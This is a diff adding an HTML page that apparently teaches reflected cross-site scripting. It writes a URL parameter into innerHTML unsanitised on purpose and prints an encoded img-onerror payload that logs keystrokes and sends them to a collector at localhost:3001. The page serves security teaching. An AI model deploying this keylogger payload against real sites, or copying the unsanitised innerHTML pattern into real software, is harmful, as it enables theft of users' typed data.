@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Example 3</title>
+</head>
+
+<body>
+    <p>In this example we will see how attackers can monitor our keyStrokes i.e. whatever we are doing on keyboard</p>
+    <p>When you will type something u can see one network call will go with all the keys you entered</p>
+    <div>Welcome <span id="username"></span>!</div>
+
+    
+
+    <script>
+        // suppose we have some cookies send by server to us, here for this example we are setting any values
+        function setCookies(name, value, days) {
+            const date = new Date();
+            date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000)); // converting days to ms
+            const expires = `expires=${date.toUTCString()}`;
+            document.cookie = `${name}=${value};${expires};path=/`
+        }
+        setCookies("exampleCookie", "Hello World !", 7);
+    </script>
+
+    <script>
+        // copy it and add as name search param in the url
+        console.log(encodeURIComponent(`<img src='does-not-exist' onerror='var timeout; var buffer = "" ;
+        document.querySelector("body").addEventListener("keypress",(e)=>{
+            if(e.key){
+                    clearTimeout(timeout);
+                    buffer += e.key
+                    timeout = setTimeout(()=>{
+                        var xhr = new XMLHttpRequest();
+                        var uri = "http://localhost:3001/keys?data="+encodeURIComponent(buffer);
+                        xhr.open("get",uri);
+                        xhr.send();
+                        buffer = "";
+                    },500)
+            }
+        }) ' />`));
+
+        const params = new URLSearchParams(window.location.search); // get search params
+        const name = params.get("name");
+        document.getElementById("username").innerHTML = name;
+    </script>
+</body>
+
+</html>
